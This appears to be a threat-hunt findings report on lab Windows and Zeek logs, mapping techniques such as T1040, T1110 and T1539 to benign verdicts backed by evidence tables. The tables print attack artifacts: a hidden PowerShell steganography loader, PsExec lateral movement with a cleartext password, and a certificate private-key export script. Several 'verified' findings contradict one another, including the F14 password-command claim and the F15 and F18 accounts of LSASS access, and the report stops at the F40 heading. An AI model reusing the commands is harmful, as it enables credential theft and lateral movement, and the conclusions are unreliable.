On scranton.dmevals.local at 2020-05-02T03:19:17Z, netsh.exe ran 'trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl"' as NT AUTHORITY\SYSTEM, and stopped it 7 seconds later with 'netsh trace stop'. Both netsh processes are direct children of the Microsoft Azure NetworkWatcherAgent service (NetworkWatcherAgent.exe /service), which was itself installed/started via its own enable.cmd at 03:20:41Z. This is the standard Azure Network Watcher packet-capture mechanism, not adversary sniffing: the capture is short-lived, writes to a GUID-named ETL under the agent's own temp folder, and is driven entirely by the signed Azure agent. No attacker-controlled process, no pcap output, no promiscuous-mode tooling.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace start capture=yes traceFile="C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPM8kte | q-6b52046f21 | ok |
| 2 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | win.ParentImage | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPM8kte | q-cd4089490f | ok |
| 3 | 2020-05-02 03:19:24.835Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\netsh.exe trace stop | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPE0PdZ | q-6b52046f21 | ok |
| 4 | 2020-05-02 03:20:42.000Z | scranton.dmevals.local | windows.security | process.command_line | "C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe"  Start /service /autoStar… | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FOC | q-2cd1a50461 | ok |

### F06 · benign / high · T1040 · No adversary network-sniffing tooling or capture drivers observed

Evidence status: **verified**

Across windows.sysmon, windows.security, windows.powershell and windows.other for the 2020-05-02 window, no sniffing tools or capture drivers were found: no tcpdump/windump/wireshark/rawcap/dumpcap process creation, no Npcap/WinPcap/pcap driver image load, no pcap/sniff/promiscuous command lines, and no .pcap files written. The only .etl writes are OS/agent telemetry (ProvTool, waasmedic, SleepStudy, WDI, ReadyBoot, NetworkWatcher). The one 'raw' command-line hit is an unrelated PowerShell steganography loader (monkey.png) on scranton, not a sniffer. The credential-access activity actually present in this window (PsExec64 with a cleartext password to \\NASHUA, and a PyInstaller python.exe payload on nashua beaconing to 192.168.0.4:8443) is lateral movement/C2, not network sniffing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-329823c7c6 | ok |
| 2 | 2020-05-02 03:11:18.000Z | scranton.dmevals.local | windows.security | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev9A | q-604d8a0354 | ok |
| 3 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | win.DestinationIp | 192.168.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPK66ha | q-19ebf75726 | ok |

### F10 · benign / medium · T1056.001 · No keylogger-specific artifacts observed

Evidence status: **verified**

Searches for keylogger indicators (GetAsyncKeyState, SetWindowsHookEx, keylog strings) in Sysmon process command lines and PowerShell script blocks returned no hits. The LSASS access observed is memory-read/credential-API style rather than keyboard hooking, so no keylogging activity was identified.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D252982) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-5ab3fda0be | ok |

### F11 · benign / medium · T1056.002 · No GUI input capture (credential prompt spoofing) observed

Evidence status: **verified**

No evidence of GUI credential prompt capture was found; the credential-related activity observed is PowerShell-based LSASS access and hardcoded-credential use, not a fake credential prompt. No matching 4688 process-creation or PowerShell prompt-capture artifacts were identified.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-ae6815e51f | ok |

### F12 · benign / medium · T1056.003 · No web portal capture observed

Evidence status: **verified**

No web-portal credential capture artifacts (IIS/wwwroot/inetpub login page modifications, w3wp activity) were found in the Windows datasets, and the zeek dataset (non-overlapping window) showed no HTTP POST activity. No web portal capture was identified.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHNH1uOFchItQB61zZ | q-ae6815e51f | ok |

### F13 · benign / high · T1110 · No brute-force authentication activity observed; credential theft via PowerShell instead

Evidence status: **verified**

Across windows.security (41002 events, 2020-05-02T02:55:25Z..03:28:09Z) there are zero 4625 failed-logon events, so no brute-force pattern exists. The only authentication-related activity is successful explicit-credential logons (4648) from PsExec (C:\Windows\PSEXESVC.exe) on nashua.dmevals.local and normal system logons (winlogon.exe DWM/UMFD accounts) on scranton.dmevals.local. The genuine credential-access activity on scranton.dmevals.local is PowerShell-based theft (LSASS handle open, certificate private-key export), which is not T1110.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-e3dd87ffa2 | ok |
| 2 | 2020-05-02 03:19:10.000Z | scranton.dmevals.local | windows.security | process.executable | C:\Windows\System32\winlogon.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV19Rnb | q-0bd903a4e2 | ok |

### F14 · benign / high · T1110.001 · No password-guessing activity (zero 4625 failures)

Evidence status: **verified**

Checks for failed logons (4625) in windows.security returned zero hits (C105/C106/C107), and no process command lines referencing passwords were found in sysmon (C110 zero) or PowerShell script blocks (C109 zero). There is no evidence of password guessing against any account on any host.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:48.000Z | scranton.dmevals.local | windows.other | message | Remote Desktop Services: Session logon succeeded:    User: DMEVALS\pbeesly  Session ID: 2  Source Network Address: 172.18.39.2 | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8RS | q-9c0d7a20eb | ok |

### F15 · benign / high · T1110.002 · No offline password-cracking artifacts; LSASS access is benign svchost query

Evidence status: **verified**

No cracking tooling was observed: no hash/crack command lines (C113 zero), no wordlist/potfile creations (C114 only benign .txt files), no SAM/SECURITY hive reads by suspicious processes (C112 zero). The 326 lsass handle-open events (C115) are dominated by C:\windows\system32\svchost.exe with GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION) on all four hosts, which is normal. A single PowerShell.exe open of lsass with 0x1FFFFF on scranton.dmevals.local at 03:05:16 is a credential-dumping indicator (T1003), not password cracking.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-4e7e7e9cd3 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-4e7e7e9cd3 | ok |

### F16 · benign / high · T1110.003 · No password-spraying activity; 4648 logons are PsExec and system accounts

Evidence status: **verified**

No 4625 failures exist to indicate spraying (C118/C119/C121 zero). The 15 explicit-credential logons (4648) are either PsExec service logons (C:\Windows\PSEXESVC.exe, account pbeesly, on nashua.dmevals.local) or normal system logons by winlogon.exe/wininit.exe/taskhostw.exe for DWM-1/UMFD-0/UMFD-1/UMFD-2/SCRANTON$ accounts on scranton.dmevals.local. No single source repeatedly authenticating many accounts was seen.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-e3dd87ffa2 | ok |
| 2 | 2020-05-02 03:19:10.000Z | scranton.dmevals.local | windows.security | win.TargetUserName | DWM-1 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV19Rnb | q-0bd903a4e2 | ok |

### F17 · benign / high · T1110.004 · No credential-stuffing activity observed

Evidence status: **verified**

No 4625 failures (C125/C126/C127 zero), no password-referencing command lines (C130 zero) and no credential/password PowerShell script blocks (C129 zero) were found. There is no evidence of reused-credential stuffing. The credential-access activity present is PowerShell certificate private-key export (Get-PrivateKeys exporting .pfx) and LSASS access on scranton.dmevals.local, which fall outside T1110.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZSl2ML | q-ab4cfce14f | ok |

### F18 · benign / high · T1111 · No MFA/smart-card interception artifacts; observed activity is PsExec lateral movement with cleartext credentials

Evidence status: **verified**

Hunting for T1111 (Multi-Factor Authentication Interception) across windows.security, windows.sysmon, windows.other and windows.powershell found no evidence of MFA interception. All credential-related hits are normal Windows components: CredentialEnrollmentManagerUserSvc service registration, Credential Manager (vaultsvc.dll), the Smart card PnP Class Filter Driver (scfilter.sys) MuiCache entry, RDP display driver (RdpIdd_IndirectDisplay) enumeration, and CredentialGuard being disabled (0x0) — all written by services.exe/System/lsass.exe on scranton.dmevals.local. LSASS access (Sysmon 10) is exclusively from svchost.exe with GrantedAccess 0x1000 (PROCESS_QUERY_LIMITED_INFORMATION), i.e. benign handle queries, not credential dumping. The only notable credential activity is PsExec lateral movement: on scranton.dmevals.local, PsExec64.exe was repeatedly run with cleartext credentials (-u dmevals\pbeesly -p Fl0nk3rt0n!T0by) targeting \\NASHUA to launch C:\Windows\Temp\python.exe, producing 4648 explicit-credential logons on nashua.dmevals.local via C:\Windows\PSEXESVC.exe and an RDP logon (LogonType 10, Negotiate) for pbeesly from 172.18.39.2. This is credential USE/lateral movement, not MFA interception, and no smart-card/OTP/MFA token artifacts exist anywhere in the data.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:14:42.601Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItPDyDoS | q-30f87f343f | ok |
| 2 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-3c7cbc7eb0 | ok |
| 3 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.LogonType | 10 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn0lP2 | q-018403046a | ok |
| 4 | 2020-05-02 03:20:42.445Z | scranton.dmevals.local | windows.sysmon | registry.path | HKU\.DEFAULT\Software\Classes\Local Settings\MuiCache\4\52C64B7E\@%SystemRoot%\System32\drivers\scfilter.sys,-11 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO3jiqC | q-92c4cbe34c | ok |
| 5 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\System\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard\Enabled | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9rO3Z | q-92c4cbe34c | ok |
| 6 | 2020-05-02 03:24:18.178Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOYDnci | q-cbb50aeb8f | ok |

### F22 · benign / medium · T1212 · Kerberos service-ticket requests (4769/4768) are routine domain authentication

Evidence status: **verified**

The 42 Kerberos events (28x 4769, 14x 4768) on newyork.dmevals.local are ordinary service-ticket requests by the account pbeesly@DMEVALS.LOCAL and machine accounts (SCRANTON$) for services such as krbtgt, NEWYORK$ and NASHUA$, sourced from internal addresses 10.0.1.4/10.0.1.6. No RC4 downgrade, no anomalous encryption type, no ticket-forging pattern is visible; these are normal domain logon/ticket activity and not exploitation for credential access.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | user.name | pbeesly@DMEVALS.LOCAL | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-6ddf9d0c3f | ok |
| 2 | 2020-05-02 03:19:13.000Z | newyork.dmevals.local | windows.security | user.name | SCRANTON$@DMEVALS.LOCAL | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItV3-aVk | q-6ddf9d0c3f | ok |

### F23 · benign / medium · T1212 · Zeek notices/weird records show only generic protocol anomalies

Evidence status: **verified**

The 14 zeek notice/weird records (ip_hdr_len_zero, truncated_IP, unknown_dce_rpc_auth_type, self-signed SSL certificate) are generic network-stack/protocol anomalies on observers simplerockbuild.simplerock.lan and bobs.bigwheel.local, in a time window (2020-04-30) that does not overlap the Windows host activity. None indicate exploitation for credential access.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:14:21.969Z | simplerockbuild.simplerock.lan | zeek | message | {"@stream":"weird","@system":"simplerockbuild.simplerock.lan","@proc":"zeek","ts":1588205661.969959,"uid":"C3HnI71C1OMdjvWltf","id_orig_h":"10.0.1.4","id_orig_p… | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYiq | q-0fc6a83d8d | ok |

### F24 · benign / high · T1539 · DavSetCookie WebDAV client cookie operation on scranton (benign)

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly's session spawned rundll32.exe invoking davclnt.dll,DavSetCookie against 192.168.0.4 http://192.168.0.4/webdav (5 process-creation events between 2020-05-01T23:08:50 and 23:10:23 local, plus matching Sysmon event.code 1 records). This is the standard Windows WebDAV client (davclnt) setting a WebDAV cookie for a mapped WebDAV resource, not theft of a browser session cookie. Parent process is svchost.exe and the command line is the documented davclnt entry point.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:50.000Z | scranton.dmevals.local | windows.security | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8Frba | q-f4946aacbb | ok |
| 2 | 2020-05-02 03:08:50.000Z | scranton.dmevals.local | windows.security | process.parent.executable | C:\Windows\System32\svchost.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ8Frba | q-f4946aacbb | ok |
| 3 | 2020-05-02 03:10:23.154Z | scranton.dmevals.local | windows.sysmon | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTVHe6C | q-87cd8b68bf | ok |

### F25 · benign / high · T1539 · INetCookies file creation by WARP JIT service on scranton (benign)

Evidence status: **verified**

Sysmon event.code 11 on scranton.dmevals.local shows svchost.exe (PID 7200, SYSTEM) creating C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies at 2020-05-02T03:21:05.681Z. This is the Windows WARP JIT service package's own INetCookies store under the LocalService service profile, not a browser session-cookie database being exfiltrated. No browser cookie store (Chrome/Edge/Firefox Cookies, Login Data, Web Data) was created or modified by any non-browser process.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-f0b99fee31 | ok |
| 2 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\System32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-f0b99fee31 | ok |

### F26 · benign / high · T1539 · Edge browser process access and file writes on scranton/nashua (benign)

Evidence status: **verified**

Sysmon event.code 10 shows MicrosoftEdge.exe / MicrosoftEdgeCP.exe being accessed only by legitimate Windows components (Explorer.EXE, svchost.exe, ctfmon.exe, browser_broker.exe) with standard access masks (0x1000/0x2000/0x101000), and event.code 11 shows MicrosoftEdge.exe writing only its own package temp/recovery files under C:\Users\pbeesly\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\... on scranton and nashua. This is normal Edge browser operation, not memory scraping or cookie-store theft. No credential-stealer tooling (mimikatz/procdump/pypykatz/lsass dump/DPAPI/vault) was observed; the only lsass-related process-creation record is lsass.exe itself.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:05.665Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\browser_broker.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUmm | q-86d03de5bc | ok |
| 2 | 2020-05-02 03:21:05.665Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUmm | q-86d03de5bc | ok |
| 3 | 2020-05-02 03:21:05.914Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Recovery\Active\RecoveryStore.{5E6C474D-D0E6-4BC1-A0… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOZEq4k | q-a0c42b850f | ok |
| 4 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9re0C | q-4d63f4fc09 | ok |

### F27 · benign / medium · T1539 · Zeek HTTP GET to WebDAV share (benign, non-overlapping window)

Evidence status: **verified**

Zeek http records (2020-04-30, a window that does not overlap the Windows telemetry) show GET /webdav/python.exe from 10.0.1.4 to 192.168.0.4 with user_agent Microsoft-WebDAV-MiniRedir/10.0.18362 and HTTP 401 Unauthorized. This is a WebDAV client retrieving a file, consistent with the davclnt/DavSetCookie activity, and carries no evidence of session-cookie theft.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:35:25.656Z | simplerockbuild.simplerock.lan | zeek | user_agent.original | Microsoft-WebDAV-MiniRedir/10.0.18362 | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrog- | q-ab2e023ad3 | ok |
| 2 | 2020-04-30 00:35:25.656Z | simplerockbuild.simplerock.lan | zeek | url.original | /webdav/python.exe | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrog- | q-ab2e023ad3 | ok |

### F31 · benign / high · T1552.002 · Registry Password/Credential value sets are OS-internal (benign)

Evidence status: **verified**

Sysmon event 13 hits on registry paths containing Password/Credential are all legitimate Windows components: svchost.exe writing HKU\.DEFAULT\Software\Microsoft\IdentityCRL\ProviderPasswordLength/CharacterGroups, lsass.exe writing DeviceGuard\Scenarios\CredentialGuard\Enabled, services.exe registering CredentialEnrollmentManagerUserSvc, and winlogon.exe writing Winlogon\PasswordExpiryNotification. None represent adversary credential storage in the registry.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:28.255Z | nashua.dmevals.local | windows.sysmon | win.TargetObject | HKU\.DEFAULT\Software\Microsoft\IdentityCRL\ProviderPasswordLength | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItThYt63 | q-c0443d809a | ok |
| 2 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\System\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard\Enabled | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9rO3Z | q-c0443d809a | ok |

### F32 · benign / medium · T1552.003 · No shell-history credential access observed

Evidence status: **verified**

No events referencing consolehost_history or shell history files were found in windows.sysmon or windows.security (checks C186/C188 returned zero hits). No evidence of shell-history credential harvesting in the available telemetry.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:02:04.324Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTpgCep | q-792a13ad0e | ok |

### F30 · benign / high · T1552.006 · GPO/SecEdit GptTmpl.inf read from sysvol by machine accounts (benign)

Evidence status: **verified**

Security event 5145 on newyork.dmevals.local shows machine accounts SCRANTON$ and NASHUA$ reading dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf from the sysvol share (AccessMask 0x120089). Zeek smb_files records show the same sysvol GptTmpl.inf/gpt.ini reads from 10.0.1.4 and 10.0.1.6. These are routine Group Policy processing by domain-joined computers, not adversary collection of Group Policy Preferences credentials. No Groups.xml with cpassword was observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:43.000Z | newyork.dmevals.local | windows.security | win.RelativeTargetName | dmevals.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaFQQvB | q-b91d182dac | ok |
| 2 | 2020-05-02 03:01:43.000Z | newyork.dmevals.local | windows.security | user.name | SCRANTON$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaFQQvB | q-b91d182dac | ok |
| 3 | 2020-04-30 00:12:01.659Z | simplerockbuild.simplerock.lan | zeek | message | {"@stream":"smb_files","@system":"simplerockbuild.simplerock.lan","@proc":"zeek","ts":1588205521.659592,"uid":"C6niUh1gdPBNBhfNDe","id_orig_h":"10.0.1.4","id_or… | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrog6 | q-fafaa1a0ad | ok |

### F35 · benign / medium · T1555.003 · No browser credential-store access observed

Evidence status: **verified**

Checks for browser credential artifacts (Login Data, logins.json, Chrome/Firefox process access, browser credential file reads) returned zero hits across sysmon, security, powershell and other datasets. No evidence of web-browser credential theft in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9re0C | q-261f78fca9 | ok |

### F36 · benign / medium · T1555.005 · No password-manager artifacts observed

Evidence status: **verified**

Checks for password-manager activity (keepass/1password/bitwarden/lastpass executables, .kdbx files, process access to password-manager processes) returned zero hits across all datasets. No evidence of password-manager store theft in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Windows\System32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO9re0C | q-261f78fca9 | ok |

### F38 · benign / medium · T1556.001 · No domain-controller authentication backdoor; 4624 type-3 logons are machine-account noise

Evidence status: **verified**

The 218 event.code 4624 LogonType 3 hits are dominated by machine accounts (NEWYORK$, SCRANTON$) logging on from ::1, fe80:: link-local and 10.0.0.4 — normal service/machine-account authentication, not a DC authentication backdoor. The 15 event.code 4648 explicit-credential logons show pbeesly credentials being used to reach NASHUA (TargetServerName NASHUA) via PSEXESVC, which is lateral movement with stolen credentials (T1078/T1021) rather than modification of DC authentication. No DC-side authentication-process tampering was observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:55:54.000Z | newyork.dmevals.local | windows.security | user.name | NEWYORK$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaKXhpQ | q-a379b69b85 | ok |
| 2 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-2550ac202b | ok |
| 3 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.TargetServerName | localhost | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-2550ac202b | ok |

### F39 · benign / high · T1556.002 · No password filter DLL registered or dropped

Evidence status: **verified**

No hits for registry writes to Notification Packages / PasswordFilter, no 4688 process creation with Notification/PasswordFilter command lines, and no PowerShell script blocks referencing password filters. The only DLL loads into authentication-related processes were legitimate Microsoft modules (cryptdll.dll, samlib.dll, samcli.dll) loaded by SearchProtocolHost/SearchFilterHost/WmiPrvSE/powershell. No password filter DLL was installed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:36.915Z | newyork.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\cryptdll.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTqhQkl | q-40a6c79b3d | ok |
| 2 | 2020-05-02 03:04:04.501Z | scranton.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\samlib.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTmc1_j | q-40a6c79b3d | ok |

### F40 · benign / high · T1556.005 · No reversible-encryption configuration observed

